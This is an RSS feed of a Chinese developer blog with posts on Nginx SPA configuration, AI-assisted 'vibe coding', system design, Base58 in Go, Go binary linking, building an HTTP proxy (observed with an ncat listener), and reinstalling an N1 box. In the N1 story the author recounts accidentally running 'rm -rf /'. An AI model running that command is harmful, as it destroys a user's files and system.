<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>杜世翔</title><link>https://www.typesafe.cn/</link><description>Recent content on 杜世翔</description><generator>Hugo</generator><language>en-us</language><lastBuildDate>Fri, 05 Sep 2025 17:03:53 +0800</lastBuildDate><atom:link href="https://www.typesafe.cn/index.xml" rel="self" type="application/rss+xml"/><item><title>Nginx 二级目录单页应用的正确配置方式</title><link>https://www.typesafe.cn/posts/nginx-subdirectory-spa-config/</link><pubDate>Fri, 05 Sep 2025 17:03:53 +0800</pubDate><guid>https://www.typesafe.cn/posts/nginx-subdirectory-spa-config/</guid><description>&lt;p>今天配置了一个 Nginx 的二级目录单页应用，搞了好久才配置好，记录一下。&lt;/p>
&lt;p>正确的配置方式示例：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"># 子应用&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>location /subapp/ &lt;span style="color:#ff79c6">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8be9fd;font-style:italic">alias&lt;/span> /opt/app/subapp/; 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> index index.html;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> try_files &lt;span style="color:#8be9fd;font-style:italic">$uri&lt;/span> /subapp/index.html;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"># 根应用&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>location / &lt;span style="color:#ff79c6">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> root /opt/app/web;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> index index.html index.htm;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> try_files &lt;span style="color:#8be9fd;font-style:italic">$uri&lt;/span> /index.html;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="坑1-使用-alias-而不是-root">坑1: 使用 &lt;code>alias&lt;/code> 而不是 &lt;code>root&lt;/code>&lt;/h3>
&lt;p>Nginx 的 root 会把 location 的匹配部分也拼接进去，所以访问：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>https://yourdomain/subapp/
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>实际会去找：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>/opt/app/subapp/subapp/index.html
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>这就多了一层 &lt;code>subapp&lt;/code> 目录，通常会 404。&lt;/p>
&lt;p>注意 alias 最后必须加 &lt;code>/&lt;/code> 。&lt;/p>
&lt;h3 id="坑2-try_files-地址要写-subappindexhtml">坑2: try_files 地址要写 &lt;code>/subapp/index.html&lt;/code>&lt;/h3>
&lt;p>之前写的 &lt;code>/index.html&lt;/code> 让我误以为是被 &lt;code>/&lt;/code> 根应用拦截了，实际上是找错 html 了。&lt;/p></description></item><item><title>“氛围编程”：别把你的大脑外包给 AI</title><link>https://www.typesafe.cn/posts/vibe-coding/</link><pubDate>Sun, 24 Aug 2025 16:19:09 +0800</pubDate><guid>https://www.typesafe.cn/posts/vibe-coding/</guid><description>&lt;h4 id="氛围编程-的定义">“氛围编程” 的定义&lt;/h4>
&lt;p>你还记得最开始使用 AI 协助编程的样子吗？&lt;/p>
&lt;p>将本应输入搜索引擎的错误信息，直接粘贴到 AI 对话框让其提供解决方案，从而省去自己寻找和筛选答案的步骤。&lt;/p>
&lt;p>又或者像使用 Copilot 那样，在 IDE 中只输入寥寥数个字符，便让 AI 补全剩下的代码。&lt;/p>
&lt;p>现在编码助手早就更进一步了，直接在输入框输入你的需求，&lt;code>Agent&lt;/code> 会自动创建文件、写入代码、编译测试，直到你满意为止。&lt;/p>
&lt;p>而你，不需要写入一行代码，甚至不需要去看 AI 生成的代码。&lt;/p>
&lt;p>这就是 “氛围编程” 。&lt;/p>
&lt;h4 id="优秀的工程师需要理解自己的代码">优秀的工程师需要理解自己的代码&lt;/h4>
&lt;p>“氛围编程” 的优点是你不需要“写”代码，但坏处也是你不需要“写”代码。&lt;/p>
&lt;ol>
&lt;li>不“写”代码，就无法真正理解代码。&lt;/li>
&lt;li>不理解的代码会导致不可预测的行为。&lt;/li>
&lt;li>不可预测的行为就会导致Bug或者漏洞。&lt;/li>
&lt;/ol>
&lt;p>当你点击 “接受全部” 的时候，就无异于玩一场代码的俄罗斯轮盘赌。&lt;/p>
&lt;p>上一个相信人工智能的人已经付出了惨痛的代价。&lt;/p>
&lt;p>&lt;img src="https://www.typesafe.cn/images/prev-trust-ai.png" alt="">&lt;/p>
&lt;h4 id="虚假的生产力和技术债">虚假的生产力和技术债&lt;/h4>
&lt;p>每一个正在运行的项目在新人看来都是一座“屎山”，区别在于之前是人工去拉，现在则是 AI 去拉，关键在于 AI 拉的又快又多。&lt;/p>
&lt;p>“氛围编程”在初期看起来效率惊人，以往需要数天才能完成的功能，现在几小时就能实现。然而，由于开发者对代码缺乏理解，一旦出现问题便难以修复，只能再次求助于 AI，从而陷入恶性循环，最终导致这份代码几乎没有“人”能维护。&lt;/p>
&lt;h4 id="ai-应该是辅助而不是替代">AI 应该是辅助，而不是替代&lt;/h4>
&lt;p>实际上，我本人也是 AI 的重度用户，并尝试过用“氛围编程”模式开发了两个项目。&lt;/p>
&lt;p>说实话，我对于这些项目没有信心，比我用 Python 开发项目还要虚的多。&lt;/p>
&lt;p>虽然我是项目的创建者，但是你问我输入 xx 应该会输出什么？我不知道。内部的计算逻辑？我不知道。&lt;/p>
&lt;p>经过这段时间的“氛围编程”实践，我发现一种更好的协作方式：自己规划好项目框架与核心逻辑，然后将增删改查（CRUD）这类模式化的部分交给 AI 实现。这样，项目才不至于偏离预期太远。&lt;/p>
&lt;hr>
&lt;p>&lt;strong>总结一下&lt;/strong>&lt;/p>
&lt;p>可以偷懒让 AI 去干苦力活，但是不要外包自己的思维，让 AI 替你去思考。&lt;/p></description></item><item><title>《关于优秀系统设计我所知道的一切》的总结</title><link>https://www.typesafe.cn/posts/good-system-design-summary/</link><pubDate>Fri, 22 Aug 2025 13:15:30 +0800</pubDate><guid>https://www.typesafe.cn/posts/good-system-design-summary/</guid><description>&lt;p>今天看到 GitHub 高级工程师写的一篇文章《Everything I know about good system design》，写的很好。&lt;/p>
&lt;p>链接地址：&lt;/p>
&lt;p>&lt;a href="https://www.seangoedecke.com/good-system-design/">https://www.seangoedecke.com/good-system-design/&lt;/a>&lt;/p>
&lt;p>总结一下。&lt;/p>
&lt;blockquote>
&lt;p>&lt;strong>真正优秀的系统设计是“不起眼的”（underwhelming）和简单的&lt;/strong>。它追求的是长期稳定运行，而不是使用各种时髦、复杂的技术。一个看起来令人印象深刻的复杂系统，往往掩盖了糟糕的底层决策。&lt;/p>&lt;/blockquote>
&lt;h3 id="核心设计哲学">核心设计哲学&lt;/h3>
&lt;ul>
&lt;li>&lt;strong>好的设计是无趣的&lt;/strong>：当你感觉某个系统“比预想的简单”或“从来不用操心”时，这恰恰是好设计的标志。&lt;/li>
&lt;li>&lt;strong>从简单开始&lt;/strong>：一个能正常工作的复杂系统，总是从一个能正常工作的简单系统演化而来的。直接从零开始构建复杂系统是个坏主意。&lt;/li>
&lt;/ul>
&lt;hr>
&lt;h3 id="状态管理-state">状态管理 (State)&lt;/h3>
&lt;ul>
&lt;li>&lt;strong>状态是万恶之源&lt;/strong>：软件设计中最难的部分就是管理状态（State）。无状态（Stateless）的服务更容易维护，因为出问题时可以直接重启恢复。&lt;/li>
&lt;li>&lt;strong>集中管理状态&lt;/strong>：尽量减少有状态的组件。最佳实践是让一个专门的服务与数据库交互来管理状态，而其他服务通过 API 请求或事件与该服务通信，而不是让多个服务都去读写同一个数据库表。&lt;/li>
&lt;/ul>
&lt;hr>
&lt;h3 id="核心组件与模式">核心组件与模式&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>&lt;strong>数据库 (Database)&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>数据库访问通常是性能瓶颈。&lt;/li>
&lt;li>&lt;strong>Schema 设计&lt;/strong>要在灵活性和可读性之间找到平衡。&lt;/li>
&lt;li>为常用查询创建&lt;strong>索引 (Index)&lt;/strong>，并将高基数（high-cardinality）的字段放在前面。&lt;/li>
&lt;li>尽可能让数据库完成工作（如使用 &lt;code>JOIN&lt;/code>），而不是在应用内存中处理数据。&lt;/li>
&lt;li>将&lt;strong>读请求&lt;/strong>分发到只读副本（read-replicas）以减轻主库压力。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>处理慢操作：后台作业 (Background Jobs)&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>面向用户的操作必须快速响应（几百毫秒内）。&lt;/li>
&lt;li>耗时长的任务（如转换一个大文件）应该放入&lt;strong>后台作业&lt;/strong>异步处理。这通常通过一个队列（Queue）和作业执行器（Job Runner）实现。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>缓存 (Caching)&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>缓存是解决昂贵重复计算的经典方案，但它本质上也是一种&lt;strong>状态&lt;/strong>，会引入复杂性（如缓存失效、数据不一致）。&lt;/li>
&lt;li>高级工程师倾向于尽可能少地使用缓存。在使用缓存前，应首先尝试从根本上优化性能（例如，为慢查询添加索引）。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>事件驱动 (Events)&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>事件中心（如 Kafka）用于实现服务解耦。一个服务发布“某事发生”的事件，多个下游服务可以消费该事件并各自处理。&lt;/li>
&lt;li>适用于&lt;strong>发送方不关心消费者行为&lt;/strong>的场景。不要过度使用，很多时候直接的 API 调用更简单、更易于追踪。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;hr>
&lt;h3 id="系统运维与容错">系统运维与容错&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>&lt;strong>关注关键路径 (Hot Paths)&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>设计时应集中精力处理系统中&lt;strong>最重要&lt;/strong>和&lt;strong>流量最大&lt;/strong>的部分。这些路径的设计方案选择更少，且一旦出错影响巨大。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>日志与监控 (Logging &amp;amp; Metrics)&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>在&lt;strong>异常路径&lt;/strong>（unhappy path）中积极记录日志，以便于排查问题。&lt;/li>
&lt;li>除了平均响应时间，还应监控 &lt;strong>p95 和 p99&lt;/strong> 分位值，因为这能反映你最大、最重要客户的真实体验。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>容错设计 (Failing Gracefully)&lt;/strong>&lt;/p></description></item><item><title>Base58 编码详解与 Go 实现</title><link>https://www.typesafe.cn/posts/base58-implementation-in-go/</link><pubDate>Sun, 10 Aug 2025 23:36:35 +0800</pubDate><guid>https://www.typesafe.cn/posts/base58-implementation-in-go/</guid><description>&lt;p>在处理二进制数据时，我们经常需要将其转换成可读的字符串，比如生成地址、密钥、邀请码等。
常见方案有 &lt;strong>Base64&lt;/strong>、&lt;strong>Hex&lt;/strong> 等，但在某些场景下，它们并不是最佳选择。
这时，&lt;strong>Base58&lt;/strong> 就登场了。&lt;/p>
&lt;h2 id="什么是-base58">什么是 Base58？&lt;/h2>
&lt;p>Base58 是一种基于 58 个字符的编码方式，它的设计目标是：&lt;/p>
&lt;ul>
&lt;li>&lt;strong>避免易混淆字符&lt;/strong>（&lt;code>0&lt;/code> 和 &lt;code>O&lt;/code>，&lt;code>l&lt;/code> 和 &lt;code>I&lt;/code>）&lt;/li>
&lt;li>&lt;strong>不包含特殊符号&lt;/strong>（&lt;code>+&lt;/code> &lt;code>/&lt;/code> 等），适合直接用于 URL、文件名&lt;/li>
&lt;li>&lt;strong>更适合人工抄写和阅读&lt;/strong>，降低输入错误率&lt;/li>
&lt;/ul>
&lt;p>它的字符集是：&lt;/p>
&lt;p>123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz&lt;/p>
&lt;blockquote>
&lt;p>可以看到，&lt;code>0&lt;/code>、&lt;code>O&lt;/code>、&lt;code>l&lt;/code>、&lt;code>I&lt;/code> 等容易混淆的字符被剔除，没有 &lt;code>+&lt;/code>、&lt;code>/&lt;/code> 这类特殊符号。&lt;/p>&lt;/blockquote>
&lt;hr>
&lt;h2 id="为什么用-base58">为什么用 Base58？&lt;/h2>
&lt;p>假设你有一个用户需要手动输入邀请码、钱包地址或交易 ID：&lt;/p>
&lt;ul>
&lt;li>如果用 &lt;strong>Base64&lt;/strong>，会出现 &lt;code>+&lt;/code> &lt;code>/&lt;/code> 等特殊字符，在 URL 中需要转义；&lt;/li>
&lt;li>如果用 &lt;strong>Hex&lt;/strong>，数据会变得很长（每个字节要用两个字符表示）；&lt;/li>
&lt;li>如果用 &lt;strong>Base58&lt;/strong>，长度更短，可读性更高，错误率更低。&lt;/li>
&lt;/ul>
&lt;p>这也是为什么比特币、IPFS 等项目都选择了 Base58（或其变种 Base58Check）。&lt;/p>
&lt;hr>
&lt;h2 id="base58-在实际项目中的应用">Base58 在实际项目中的应用&lt;/h2>
&lt;ul>
&lt;li>&lt;strong>比特币地址&lt;/strong>：Base58Check 编码，防止字符混淆并带有校验码&lt;/li>
&lt;li>&lt;strong>IPFS CID&lt;/strong>：文件内容 ID 使用 Base58 编码，更短且可直接用在命令行&lt;/li>
&lt;li>&lt;strong>邀请码 / 短链&lt;/strong>：直接放在 URL 中，不需要额外转义&lt;/li>
&lt;/ul>
&lt;hr>
&lt;h2 id="go-语言-base58-编码示例">Go 语言 Base58 编码示例&lt;/h2>
&lt;p>这里用我开源的 Golang Base58 库来演示：&lt;/p></description></item><item><title>使用 EdgeOne Pages 托管Hugo博客</title><link>https://www.typesafe.cn/posts/hugo-on-edgeone-pages/</link><pubDate>Fri, 11 Jul 2025 12:30:00 +0800</pubDate><guid>https://www.typesafe.cn/posts/hugo-on-edgeone-pages/</guid><description>&lt;p>自从腾讯云客服给我打电话说我的备案域名解析到了境外IP上让我整改，已经过去了两年。&lt;/p>
&lt;p>当时我把解析到 Github Pages 的域名更改到了轻量云，并且把 Github Pages 打包下来使用 Caddy 搭建了静态网站，由于更新不便，我再也没有更新过博客。&lt;/p>
&lt;p>前段时间白嫖了 EdgeOne 免费 CDN 测试加速 Github Pages，说实话并不好用。&lt;/p>
&lt;p>首先第一次请求回源到 Github 特别慢，大概率是用了国内的节点去请求；其次 CDN 的缓存加速功能，我更新了博客的内容就需要手动把 CDN 的缓存全部清空才行，不缓存的话又起不到加速的作用。&lt;/p>
&lt;p>今天忙里偷闲，测试一下EdgeOne Pages 托管Hugo博客，EdgeOne Pages 是支持 Node.js 相关的框架预设，我以为托管 Hugo 博客会很麻烦，结果发现真的很简单。&lt;/p>
&lt;p>首先，你要先把 Hugo 托管到 Github Pages 上，这步教程很多，我就不再赘述。&lt;/p>
&lt;p>然后，你要在 EdgeOne 上创建一个 Pages 项目，选择你的 Github Pages 仓库，记得分支选择编译后文件所在的 &lt;code>gh-pages&lt;/code> 然后选择 Other 预设，其他不需要改变。&lt;/p>
&lt;p>&lt;img src="https://www.typesafe.cn/images/edgeone-pages-deploy.png" alt="">&lt;/p>
&lt;p>最后点击开始部署，等待部署完成即可。&lt;/p>
&lt;hr>
&lt;p>每次提交后，Github Action 自动编译发布在分支 &lt;code>gh-pages&lt;/code> 上， EdgeOne 会自动检测到仓库 &lt;code>gh-pages&lt;/code> 分支的变化，最后更新到 EdgeOne Pages 上。&lt;/p></description></item><item><title>Golang 二进制文件的静态和动态链接</title><link>https://www.typesafe.cn/posts/golang-binary-linking-types/</link><pubDate>Tue, 07 Jan 2025 00:00:00 +0800</pubDate><guid>https://www.typesafe.cn/posts/golang-binary-linking-types/</guid><description>&lt;h2 id="概述">概述&lt;/h2>
&lt;p>Golang 最大的优势之一就是支持跨平台编译，真正的实现了Java的梦想：一次编译，到处运行。&lt;/p>
&lt;p>不过，在某些特定情况下，也会存在一些特殊之处。&lt;/p>
&lt;h2 id="静态链接与动态链接">静态链接与动态链接&lt;/h2>
&lt;p>&lt;strong>静态链接&lt;/strong>是是在编译时将程序与所依赖的所有库（通常是 &lt;code>.a&lt;/code> 或 &lt;code>.lib&lt;/code> 文件）一起打包，生成一个独立的可执行文件。也就是说，所有需要的函数和库代码在编译过程中就已经嵌入到可执行文件中。&lt;/p>
&lt;p>因为这样编译出来的二进制更便携，它不需要在其运行的主机系统上存在库。因此，你的二进制文件可以在任何系统上运行，无论哪个发行版/版本，并且不依赖于任何系统库。&lt;/p>
&lt;p>&lt;strong>动态链接&lt;/strong>是在程序运行时（即执行时）将程序与共享库（如 &lt;code>.dll&lt;/code>、&lt;code>.so&lt;/code> 或 &lt;code>.dylib&lt;/code> 文件）链接。程序本身包含对这些库的引用，而不直接包含库的代码。程序启动时，操作系统会加载这些库文件并链接到程序。&lt;/p>
&lt;p>这种方式的优点是比较灵活，如果依赖的库发生了更新，只要接口没变，程序不需要编译就可以使用最新版本的库，而且因为二进制包含对库的引用，不包含库代码，因此文件较小。&lt;/p>
&lt;h2 id="静态链接程序">静态链接程序&lt;/h2>
&lt;p>我们先来编写一个简单的 “Hello World” 程序，，经过打包后，它将成为一个静态链接的二进制文件。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-go" data-lang="go">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">package&lt;/span> main 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8be9fd;font-style:italic">func&lt;/span> &lt;span style="color:#50fa7b">main&lt;/span>() { 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8be9fd;font-style:italic">println&lt;/span>(&lt;span style="color:#f1fa8c">&amp;#34;hello world!&amp;#34;&lt;/span>) 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>接着编译这个 Go 文件：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>go build -o main1 main.go
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>然后使用 &lt;code>file&lt;/code> 命令来检查文件类型：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ file main1 | tr , &lt;span style="color:#f1fa8c">&amp;#39;\n&amp;#39;&lt;/span> 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>hello_linux: ELF 64-bit LSB executable
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> x86-64
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> version &lt;span style="color:#bd93f9">1&lt;/span> &lt;span style="color:#ff79c6">(&lt;/span>SYSV&lt;span style="color:#ff79c6">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> statically linked
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Go &lt;span style="color:#8be9fd;font-style:italic">BuildID&lt;/span>&lt;span style="color:#ff79c6">=&lt;/span>...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> with debug_info
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> not stripped
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>从上述命令的输出结果可知，&lt;code>main1&lt;/code> 文件属于 &lt;strong>64 位静态链接的 ELF 格式&lt;/strong> 可执行文件，适用于 &lt;strong>x86-64&lt;/strong> 架构，包含了 &lt;strong>调试信息&lt;/strong>，并且没有进行 &lt;strong>剥离&lt;/strong>（即保留了调试符号）。&lt;/p></description></item><item><title>HTTP代理的原理和实现</title><link>https://www.typesafe.cn/posts/http-proxy/</link><pubDate>Thu, 02 Jan 2025 00:00:00 +0800</pubDate><guid>https://www.typesafe.cn/posts/http-proxy/</guid><description>&lt;p>HTTP 代理可以说是每个开发者都绕不开的工具。几乎每天都会使用，但你真的了解 HTTP 代理的原理吗？&lt;/p>
&lt;blockquote>
&lt;p>&lt;strong>说明&lt;/strong>：这里讨论的 HTTP 代理是指 HTTP Proxy Server，具体是正向 HTTP 代理服务端的原理和实现。&lt;/p>&lt;/blockquote>
&lt;p>想了解 HTTP 代理的原理，最严谨的方法是阅读 RFC 文档，但这同时也是最困难的方式。今天，我将介绍一种更直观的学习技巧。&lt;/p>
&lt;p>从名字上就可以看出，HTTP 代理基于 HTTP 协议，而 HTTP 协议运行在 TCP 之上。我们可以直接监听某个 TCP 端口，模拟 HTTP 代理服务端，同时使用 &lt;code>curl&lt;/code> 命令通过代理访问网站，观察具体数据，再决定如何实现这个 HTTP 代理服务端。&lt;/p>
&lt;hr>
&lt;h2 id="代理-http-请求">代理 HTTP 请求&lt;/h2>
&lt;p>&lt;strong>步骤 1&lt;/strong>：使用 &lt;code>ncat&lt;/code> 监听端口 7788。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>ncat -lvp &lt;span style="color:#bd93f9">7788&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;strong>步骤 2&lt;/strong>：执行 &lt;code>curl&lt;/code> 命令，通过代理访问百度的 HTTP 协议。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>curl http://baidu.com/123?a&lt;span style="color:#ff79c6">=&lt;/span>&lt;span style="color:#bd93f9">1&lt;/span> --proxy 127.0.0.1:7788
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;strong>步骤 3&lt;/strong>：查看 &lt;code>ncat&lt;/code> 的输出：&lt;/p>
&lt;pre tabindex="0">&lt;code>Ncat: Connection from 127.0.0.1:58458.
GET http://baidu.com/123?a=1 HTTP/1.1
Host: baidu.com
User-Agent: curl/8.7.1
Accept: */*
Proxy-Connection: Keep-Alive
&lt;/code>&lt;/pre>&lt;p>第一行是 &lt;code>ncat&lt;/code> 输出的信息，可以忽略。后面的内容完全是 HTTP 协议的数据。&lt;/p></description></item><item><title>about</title><link>https://www.typesafe.cn/about/</link><pubDate>Wed, 01 Jan 2025 23:36:35 +0800</pubDate><guid>https://www.typesafe.cn/about/</guid><description>&lt;p>你好，我是杜世翔，软件开发工程师。&lt;/p>
&lt;p>我主要使用 Golang，对 Java、JavaScript、Python 也比较熟悉。&lt;/p>
&lt;p>目前在奇安信从事安全开发工作。&lt;/p>
&lt;hr>
&lt;p>我开发了 &lt;a href="https://github.com/dushixiang/next-terminal">Next Terminal&lt;/a> ，一个简洁、安全、易用的运维审计系统，支持多种远程访问协议，包括 RDP、SSH、VNC、Telnet、HTTP 等，适用于企业级运维场景。&lt;/p>
&lt;hr>
&lt;p>以下是我开源的其他几个项目：&lt;/p>
&lt;ul>
&lt;li>&lt;strong>&lt;a href="https://github.com/dushixiang/kafka-map">kafka-map&lt;/a>&lt;/strong> 一个美观简洁且强大的kafka web管理工具。&lt;/li>
&lt;li>&lt;strong>&lt;a href="https://github.com/dushixiang/4dnat">4dnat&lt;/a>&lt;/strong> 一个专门为目的地址转发而服务的工具。&lt;/li>
&lt;/ul></description></item><item><title>记一次曲折的N1盒子重装系统经历</title><link>https://www.typesafe.cn/posts/phicomm-n1-system-reinstallation/</link><pubDate>Sun, 28 Jan 2024 19:31:00 +0800</pubDate><guid>https://www.typesafe.cn/posts/phicomm-n1-system-reinstallation/</guid><description>&lt;h2 id="为什么要重装系统">为什么要重装系统？&lt;/h2>
&lt;p>倒不是为了折腾，而是我手上这台斐讯 N1 盒子（armbian系统）在上个月让我不小心 &lt;code>rm -rf /&lt;/code> 全给删除了，等我反应过来的时候已经为时已晚。&lt;/p>
&lt;p>由于 Linux 系统的特性，我运行的程序只要不重启系统都还能正常使用，我也懒得立刻处理，就这样挺到了现在。终于在本周五下班之后我心血来潮，准备给它重装一个系统，但没有想到让我花费了将近10个小时。&lt;/p>
&lt;h2 id="第一个坑垃圾百度云盘下载速度感人">第一个坑，垃圾百度云盘下载速度感人&lt;/h2>
&lt;p>N1 盒子是一个比较老的设备了，刷机救砖教程也都是2020年或者更早的时候发布的，那个时候恩山论坛上的大佬主要还是用百度云盘来共享工具。&lt;/p>
&lt;p>每秒100KB的下载速度下载1个多GB的资料让人等的着急。&lt;/p>
&lt;h2 id="第二个坑刷机工具版本之坑">第二个坑，刷机工具版本之坑&lt;/h2>
&lt;p>Amlogic线刷工具 USB Burning Tool 有两个版本 v3.1.0 和 v2.2.4，理论上来说 v3.1.0 是新的版本，所以我刚开始安装的也是这个版本，但是我在使用的过程中各种错误，而且分辨率在我4k的屏幕上表现也很糟糕，最后下载了 v2.2.4 才能正常使用。&lt;/p>
&lt;h2 id="第三个坑刷机工具识别不到设备">第三个坑，刷机工具识别不到设备&lt;/h2>
&lt;p>前面说了，我的盒子不是原来的安卓系统了，现在运行的是 armbian，而且系统被我破坏了无法正常启动。也就导致常规手段都无法让工具识别，我看到有人说设备先不要供电，先在工具导入烧录包，然后点击【开始】，并且在3秒内迅速上电就可以识别到并且刷机了，我像个傻子一样尝试了很多遍。&lt;/p>
&lt;p>消息来源：https://www.right.com.cn/forum/thread-4041517-1-1.html&lt;/p>
&lt;h2 id="第四个坑刷机报错">第四个坑，刷机报错&lt;/h2>
&lt;p>本来不想拆的，因为麻烦，但最终没有其他办法的我还是拆机进行了短接，需要一把非常细且长的螺丝刀和一个镊子进行短接，幸亏我乱七八糟的工具比较多，翻箱倒柜找到了合适的工具。&lt;/p>
&lt;p>我上一次刷机还是几年前，具体的过程我已经忘记了，这次我也只下载了一个 N1 的固件，刷的时候进度到 1% 就报错了，然后就看到说要先刷 T1 的固件，因为需要 T1 固件中前面的一部分，我又从百度云盘下载了 T1 的固件，并且严格安装网上的教程来尝试，不幸的是还是失败了。&lt;/p>
&lt;p>又看到有人说可能是USB口的问题，我便把电脑上的6个USB口都试了一遍，还是行不通。&lt;/p>
&lt;p>上网又查了一下，说是AMD硬件的问题，换了因特尔的就好了。&lt;/p>
&lt;p>WTF？？？&lt;/p>
&lt;p>这个时候已经凌晨一点钟，搞得我心态爆炸。感觉面对这种【黑盒子】太无力了，竟然还有人能享受这个过程，我是无法理解的。&lt;/p>
&lt;p>总之周五晚上从7点钟干到凌晨1点钟并没有解决这个问题。&lt;/p>
&lt;h2 id="第五个坑u盘启动">第五个坑，U盘启动&lt;/h2>
&lt;p>周六的时候我又测试了几遍刷机的方案，还是行不通，我便想着使用常规Windows和Linux装系统的方案，使用 U盘 启动来装系统。&lt;/p>
&lt;p>搜索了一下找到了这个项目 &lt;a href="https://github.com/ophub/amlogic-s9xxx-armbian">https://github.com/ophub/amlogic-s9xxx-armbian&lt;/a> ，从release下载到了合适的固件，之后找了一个U盘搭配 rufus 把固件写入到了 U盘。&lt;/p>
&lt;p>我便开始了U盘启动之旅，尴尬的是 N1 并没有 BIOS 这个东西，我查询到的U盘启动方案都是在原来安卓系统下，使用 telnet 连接上之后执行指令来控制从U盘启动，但是我的 N1 在启动之后会卡在启动 armbian 失败的页面上。&lt;/p></description></item><item><title>HTTPS 双向认证原理和实现方式</title><link>https://www.typesafe.cn/posts/https-mutual-auth-implementation/</link><pubDate>Thu, 23 Nov 2023 00:00:00 +0800</pubDate><guid>https://www.typesafe.cn/posts/https-mutual-auth-implementation/</guid><description>&lt;p>双向认证的含义就是服务端和客户端都需要验证对方的身份，相比普通的单向认证多了一些步骤。&lt;/p>
&lt;h2 id="基础概念">基础概念&lt;/h2>
&lt;p>下面先讲一些 https 相关的概念。&lt;/p>
&lt;p>&lt;strong>对称加密&lt;/strong>&lt;/p>
&lt;p>对称加密是一种加密算法，使用相同的密钥来加密和解密数据。
